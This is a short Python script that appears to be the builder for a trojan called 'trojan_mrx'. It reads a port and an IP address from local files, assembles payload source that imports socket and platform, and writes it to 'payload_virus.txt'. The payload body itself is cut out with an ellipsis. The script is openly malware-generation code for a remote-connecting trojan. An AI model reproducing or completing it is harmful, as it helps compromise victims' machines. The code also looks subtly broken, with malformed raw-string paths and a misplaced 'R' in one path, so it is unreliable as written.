import os
login=os.getlogin()
he=open(R"C:\Users\""+str(login)+R"\Downloads\trojan_mrx\source\trojan\port.txt","r").read()
name=open(R"C:\Users\""+str(login)+R"\Downloads\trojan_mrx\source\trojan\ip.txt","r").read()
text="""
import os
import socket
import platform
...
file159=open(R"C:\Users\""+str(login)+"R\Downloads\trojan_mrx\source\payload_virus.txt","w").write(str(full_text))
